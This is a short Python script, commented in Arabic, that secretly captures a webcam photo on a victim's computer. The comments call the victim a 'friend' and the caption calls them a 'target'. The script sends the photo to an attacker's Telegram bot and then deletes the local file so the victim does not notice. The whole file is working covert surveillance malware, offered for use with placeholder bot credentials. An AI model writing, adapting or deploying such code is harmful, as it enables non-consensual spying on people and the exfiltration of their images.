import cv2
import requests
import time
import os

# --- بياناتك السرية ---
TOKEN = "هنا_ضع_التوكن_الذي_أعطاك_إياه_BotFather"
CHAT_ID = "هنا_ضع_الرقم_الذي_أعطاك_إياه_userinfobot"

def capture_and_send():
    # 1. تشغيل الكاميرا في الخلفية
    cap = cv2.VideoCapture(0)
    
    # ننتظر قليلاً لضبط الإضاءة تلقائياً
    time.sleep(2)
    
    ret, frame = cap.read()
    
    if ret:
        image_path = "temp_image.jpg"
        cv2.imwrite(image_path, frame)
        cap.release()
        
        # 2. إرسال الصورة عبر تليجرام
        url = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
        with open(image_path, 'rb') as photo:
            files = {'photo': photo}
            data = {'chat_id': CHAT_ID, 'caption': '😉 تم اصطياد الهدف بنجاح!'}
            
            try:
                response = requests.post(url, files=files, data=data)
                if response.status_code == 200:
                    print("تم الإرسال لتليجرام!")
                else:
                    print("خطأ في الإرسال.")
            except Exception as e:
                print(f"حدث خطأ: {e}")
        
        # 3. مسح الصورة من جهاز الصديق فوراً لكي لا يراها
        if os.path.exists(image_path):
            os.remove(image_path)
            
    else:
        cap.release()
        print("لم يتمكن البرنامج من فتح الكاميرا.")

# تشغيل الدالة
capture_and_send()